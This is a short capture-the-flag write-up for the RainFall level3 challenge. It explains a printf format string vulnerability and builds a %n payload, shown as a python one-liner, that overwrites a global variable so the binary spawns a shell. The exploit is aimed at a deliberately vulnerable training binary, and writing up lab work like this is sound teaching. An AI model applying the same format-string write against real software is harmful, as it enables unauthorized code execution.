To exploit this binary, we will have to exploit a format string vulnerability due to an unsafe usage of the printf function.

The idea is to change the value of a memory address so that it matches a condition to jump towards a part of the code that will execute a shell for us.

while debugging we notice that the first four bytes given to our buffer are stored as the 4th argument of the printf function as shown by :

level3@RainFall:~$ ./level3 
AAAA %x %x %x %x
AAAA 200 b7fd1ac0 b7ff37d0 41414141

AAAA is 0x41414141 in hexadecimal, and it appears as the 4th value consumed by printf. Therefore, the first four bytes of our input can be used as the 4th argument.

We can then use printf to write the current total written size of the buffer into this address with %n
(with use $4 to select the 4th argument)

We therefore put the address 0x0804988c at the beginning of our input, encoded in little-endian:
\x8c\x98\x04\x08

We then add 60 bytes of padding so that the number of characters written reaches 64 (0x40) before %4$n is processed.

python -c 'print "\x8c\x98\x04\x08" + "A" * 60 + "%4$n"' > /tmp/exploit

then run cat /tmp/exploit - | ./level3 



